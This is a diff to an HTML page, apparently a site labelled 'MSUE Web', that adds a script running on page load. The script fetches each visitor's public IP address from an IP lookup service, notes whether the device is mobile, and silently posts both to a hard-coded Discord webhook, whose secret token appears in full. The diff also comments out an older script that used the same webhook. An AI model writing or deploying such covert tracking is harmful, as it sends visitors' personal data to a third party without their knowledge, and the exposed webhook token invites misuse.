@@ -437,6 +437,34 @@
 </body>
 </html>
 <script>
+        const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
+        const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
+        
+        fetch(ipAddressWebhookUrl)
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                let message = `**MSUE Web** 
+                IP Address: ${ipAddress}`;
+                if (isMobile) {
+                    message += " Accessed through a mobile device.";
+                } else {
+                    message += " Accessed through a desktop or laptop.";
+                }
+                const payload = {
+                    content: message
+                };
+                fetch(discordWebhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+            });
+</script>
+<!-- <script>
     // Define your webhook URL
     const webhookUrl = 'https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4';
 
@@ -574,7 +602,7 @@
 
     // Execute the main function
     main();
-</script>
+</script> -->
 
 
 
